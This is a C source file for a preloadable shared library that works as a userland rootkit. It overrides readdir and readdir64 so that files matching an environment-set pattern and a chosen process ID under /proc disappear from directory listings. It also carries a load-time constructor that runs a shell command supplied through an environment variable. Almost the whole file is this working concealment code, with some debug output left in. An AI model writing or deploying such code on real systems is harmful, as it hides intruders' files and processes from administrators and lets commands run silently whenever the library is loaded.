#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

DIR* opendir(const char* name)
{
    static DIR* (*orig_opendir)(const char*) = NULL;
    if (!orig_opendir)
        orig_opendir = dlsym(RTLD_NEXT, "opendir");

    DIR* result = orig_opendir(name);

    return result;
}

struct dirent64* readdir64(DIR* dirp)
{
    static struct dirent64* (*orig_readdir64)(DIR * dirp) = NULL;
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    char* hide_me = getenv("LS_PATTERN");
    char* hide_pid = getenv("LS_LOCK");

    struct dirent64* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent64* temp = orig_readdir64(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir64(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }
        if (hide_pid && strcmp(pwd, "/proc") == 0) {
            if (strcmp(result->d_name, hide_pid) == 0) {
                printf("   HIT: %s\n", hide_pid);
                closedir(proc_1);
                return temp;
            }
        }
        if (hide_me && strstr(result->d_name, hide_me)) {
            printf("   HIT: %s\n", hide_me);
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}
struct dirent* readdir(DIR* dirp)
{
    static struct dirent* (*orig_readdir)(DIR * dirp) = NULL;
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    char* hide_me = getenv("LS_PATTERN");
    char* hide_pid = getenv("LS_LOCK");

    struct dirent* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent* temp = orig_readdir(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }
        if (hide_pid && strcmp(pwd, "/proc") == 0) {
            if (strcmp(result->d_name, hide_pid) == 0) {
                printf("   HIT: %s\n", hide_pid);
                closedir(proc_1);
                return temp;
            }
        }
        if (hide_me && strstr(result->d_name, hide_me)) {
            printf("   HIT: %s\n", hide_me);
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}

void __attribute__((constructor)) initLibrary(void)
{
    char* emp_path = getenv("LS_PATH");
    if (emp_path)
        execlp("sh", "-c", emp_path, (char*)0);
}

/* void __attribute__((destructor)) cleanUpLibrary(void) */
/* { */
/* } */
